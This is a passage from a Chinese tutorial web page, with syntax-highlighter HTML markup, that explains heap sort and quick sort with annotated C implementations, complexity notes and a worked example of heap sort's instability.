最优时间复杂度 ---- O(nlogn)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-7\"><span class=\"crayon-c\">// 平均时间复杂度 ---- O(nlogn)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b8b427729141-8\"><span class=\"crayon-c\">// 所需辅助空间 ------ O(1)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-9\"><span class=\"crayon-c\">// 稳定性 ------------ 不稳定</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b8b427729141-10\"> </div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-11\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b8b427729141-12\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Swap</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-13\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b8b427729141-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">temp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-15\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b8b427729141-16\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">temp</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-17\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b8b427729141-18\"> </div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-19\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Heapify</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span><span class=\"crayon-c\">// 从A[i]向下进行堆调整</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b8b427729141-20\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-21\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">left_child</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">         </span><span class=\"crayon-c\">// 左孩子索引</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b8b427729141-22\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right_child</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 右孩子索引</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-23\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">max</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">                        </span><span class=\"crayon-c\">// 选出当前结点与其左右孩子三者之中的最大值</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b8b427729141-24\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">left_child</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">left_child</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">max</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-25\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">max</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">left_child</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b8b427729141-26\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">right_child</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">right_child</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">max</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-27\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">max</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right_child</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b8b427729141-28\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">max</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-29\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b8b427729141-30\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">Swap</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">max</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">                </span><span class=\"crayon-c\">// 把当前结点和它的最大(直接)子节点进行交换</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-31\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">Heapify</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">max</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">          </span><span class=\"crayon-c\">// 递归调用，继续从当前结点向下进行堆调整</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b8b427729141-32\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-33\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b8b427729141-34\"> </div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-35\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">BuildHeap</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">           </span><span class=\"crayon-c\">// 建堆，时间复杂度O(n)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b8b427729141-36\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-37\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">heap_size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b8b427729141-38\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">heap_size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 从每一个非叶结点开始向下进行堆调整</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-39\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">Heapify</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">heap_size</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b8b427729141-40\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">heap_size</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-41\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b8b427729141-42\"> </div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-43\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">HeapSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b8b427729141-44\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-45\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">heap_size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">BuildHeap</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 建立一个最大堆</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b8b427729141-46\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">heap_size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">    </span>　　　　　　<span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 堆（无序区）元素个数大于1，未完成排序</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-47\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b8b427729141-48\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 将堆顶元素与堆的最后一个元素互换，并从堆中去掉最后一个元素</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-49\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 此处交换操作很有可能把后面元素的稳定性打乱，所以堆排序是不稳定的排序算法</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b8b427729141-50\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">Swap</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">heap_size</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-51\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">Heapify</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">heap_size</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">     </span><span class=\"crayon-c\">// 从新的堆顶元素开始向下进行堆调整，时间复杂度O(logn)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b8b427729141-52\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-53\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b8b427729141-54\"> </div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-55\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b8b427729141-56\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-57\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span><span class=\"crayon-c\">// 从小到大堆排序</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b8b427729141-58\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-59\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">HeapSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b8b427729141-60\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"堆排序结果：\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-61\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b8b427729141-62\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-63\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"%d \"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b8b427729141-64\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-65\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"\\n\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b8b427729141-66\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-67\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.1725 seconds] -->\r\n<p>堆排序算法的演示：</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fr773tznndg207s05ydn6.gif\" width=\"280\" height=\"214\"></p>\n<p>动画中在排序过程之前简单的表现了创建堆的过程以及堆的逻辑结构。</p>\n<p><strong>堆排序是不稳定的排序算法，不稳定发生在堆顶元素与A[i]交换的时刻。</strong></p>\n<p>比如序列：{ 9, 5, 7, 5 }，堆顶元素是9，堆排序下一步将9和第二个5进行交换，得到序列 { 5, 5, 7, 9 }，再进行堆调整得到{ 7, 5, 5, 9 }，重复之前的操作最后得到{ 5, 5, 7, 9 }从而改变了两个5的相对次序。</p>\n<h2>快速排序(Quick Sort)</h2>\n<p>快速排序是由东尼·霍尔所发展的一种排序算法。在平均状况下，排序n个元素要O(nlogn)次比较。在最坏状况下则需要O(n^2)次比较，但这种状况并不常见。事实上，快速排序通常明显比其他O(nlogn)算法更快，因为它的内部循环可以在大部分的架构上很有效率地被实现出来。</p>\n<p>快速排序使用分治策略(Divide and Conquer)来把一个序列分为两个子序列。步骤为：</p>\n<ol>\n<li>从序列中挑出一个元素，作为”基准”(pivot).</li>\n<li>把所有比基准值小的元素放在基准前面，所有比基准值大的元素放在基准的后面（相同的数可以到任一边），这个称为分区(partition)操作。</li>\n<li>对每个分区递归地进行步骤1~2，递归的结束条件是序列的大小是0或1，这时整体已经被排好序了。</li>\n</ol>\n<p>快速排序的代码如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4ad567a1b92422256329\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#include &lt;stdio.h&gt;\r\n\r\n// 分类 ------------ 内部比较排序\r\n// 数据结构 --------- 数组\r\n// 最差时间复杂度 ---- 每次选取的基准都是最大（或最小）的元素，导致每次只划分出了一个分区，需要进行n-1次划分才能结束递归，时间复杂度为O(n^2)\r\n// 最优时间复杂度 ---- 每次选取的基准都是中位数，这样每次都均匀的划分出两个分区，只需要logn次划分就能结束递归，时间复杂度为O(nlogn)\r\n// 平均时间复杂度 ---- O(nlogn)\r\n// 所需辅助空间 ------ 主要是递归造成的栈空间的使用(用来保存left和right等局部变量)，取决于递归树的深度，一般为O(logn)，最差为O(n)       \r\n// 稳定性 ---------- 不稳定\r\n\r\nvoid Swap(int A[], int i, int j)\r\n{\r\n    int temp = A[i];\r\n    A[i] = A[j];\r\n    A[j] = temp;\r\n}\r\n\r\nint Partition(int A[], int left, int right)  // 划分函数\r\n{\r\n    int pivot = A[right];               // 这里每次都选择最后一个元素作为基准\r\n    int tail = left - 1;                // tail为小于基准的子数组最后一个元素的索引\r\n    for (int i = left; i &lt; right; i++)  // 遍历基准以外的其他元素\r\n    {\r\n        if (A[i] &lt;= pivot)              // 把小于等于基准的元素放到前一个子数组末尾\r\n        {\r\n            Swap(A, ++tail, i);\r\n        }\r\n    }\r\n    Swap(A, tail + 1, right);           // 最后把基准放到前一个子数组的后边，剩下的子数组既是大于基准的子数组\r\n                                        // 该操作很有可能把后面元素的稳定性打乱，所以快速排序是不稳定的排序算法\r\n    return tail + 1;                    // 返回基准的索引\r\n}\r\n\r\nvoid QuickSort(int A[], int left, int right)\r\n{\r\n    if (left &gt;= right)\r\n        return;\r\n    int pivot_index = Partition(A, left, right); // 基准的索引\r\n    QuickSort(A, left, pivot_index - 1);\r\n    QuickSort(A, pivot_index + 1, right);\r\n}\r\n\r\nint main()\r\n{\r\n    int A[] = { 5, 2, 9, 4, 7, 6, 1, 3, 8 }; // 从小到大快速排序\r\n    int n = sizeof(A) / sizeof(int);\r\n    QuickSort(A, 0, n - 1);\r\n    printf(\"快速排序结果：\");\r\n    for (int i = 0; i &lt; n; i++)\r\n    {\r\n        printf(\"%d \", A[i]);\r\n    }\r\n    printf(\"\\n\");\r\n    return 0;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b92422256329-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b92422256329-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b92422256329-3\">3</div><div 